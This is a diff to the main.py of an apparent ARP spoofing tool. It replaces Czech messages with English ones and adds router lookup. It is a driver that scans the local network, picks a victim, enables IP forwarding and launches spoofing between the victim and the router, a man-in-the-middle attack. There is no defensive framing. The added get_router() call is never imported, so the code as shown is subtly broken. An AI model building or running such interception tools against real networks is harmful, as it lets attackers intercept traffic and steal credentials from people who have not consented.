@@ -1,25 +1,28 @@
-# main.py
 from .network_utils import scan_network, select_target, toggle_forwarding
 from .spoofer_logic import spoof
 
 def main():
-    # 1. Sken sítě
-    print("[*] Skenuji síť...\n")
+    print("[+] Start")
+
     scan_network()
 
-    # 2. Výběr oběti
     target_ip, target_mac = select_target()
-    if not target_ip:
-        print("[-] Nepodařilo se vybrat cíl. Ukončuji.")
-        return
 
-    # 3. Zapnutí IP forwardingu
-    print("\n[+] Zapínám IP forwarding...")
+    if not target_ip:
+        print("[-] No target selected. Exiting.")
+        return
+    
+    router_ip, router_mac = get_router()
+
+    if not router_ip:
+        print("[-] Router not found. Exiting.")
+        return
+    
+    print("[+] Enabling IP forwarding...")
     toggle_forwarding(True)
 
-    # 4. Spuštění ARP spoofingu
-    print("\n[*] Spouštím ARP spoof...\n")
-    spoof(target_ip, target_mac)
+    print("[+] Starting ARP spoofing...")
+    spoof(target_ip, target_mac, router_ip, router_mac)
 
 if __name__ == "__main__":
     main()
